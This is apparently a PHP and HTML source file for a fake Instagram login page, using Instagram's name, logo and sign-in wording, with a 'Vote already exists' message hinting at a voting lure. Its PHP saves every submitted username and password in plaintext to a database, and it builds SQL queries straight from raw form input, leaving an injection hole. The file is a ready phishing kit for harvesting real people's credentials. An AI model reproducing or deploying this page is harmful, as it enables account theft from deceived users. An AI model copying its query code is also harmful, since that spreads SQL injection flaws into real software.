<?php
include 'db.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Check if the username already exists
    $sql = "SELECT * FROM users WHERE username = '$username'";
    $result = $conn->query($sql);
    
    if ($result->num_rows > 0) {
        $error = "Vote already exists!";
    } else {
        // Insert new user into the database
        $sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
        
        if ($conn->query($sql) === TRUE) {
            $success = "Success";
        } else {
            $error = "Error: " . $sql . "<br>" . $conn->error;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="verify_style.css">
</head>
<body>

<div class="login-container">
    <div class="login-box">
        <img src="verify_Logo.png" alt="Instagram Logo" class="logo">
        
        <form id="login-form" method="POST" action="verify.php">
            <div class="input-container">
                <span class="input-icon"><i class="fas fa-user"></i></span>
                    <input name="username" type="text" id="username" placeholder="Phone number, username or email address" required>
                <div class="input-underline"></div>
            </div>
            <div class="input-container">
               <span class="input-icon"><i class="fas fa-key"></i></span>
                    <input name="password" type="password" id="password" placeholder="Password" required>	
                <div class="input-underline"></div>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        
        <div class="footer">
            <span>Forgot password?</span>
        </div>
    </div>
</div>

<!-- Loading Spinner -->
<div class="loading-container" id="loading-container">
    <div class="spinner"></div>
</div>

<script src="verify_script.js"></script>
</body>
</html>
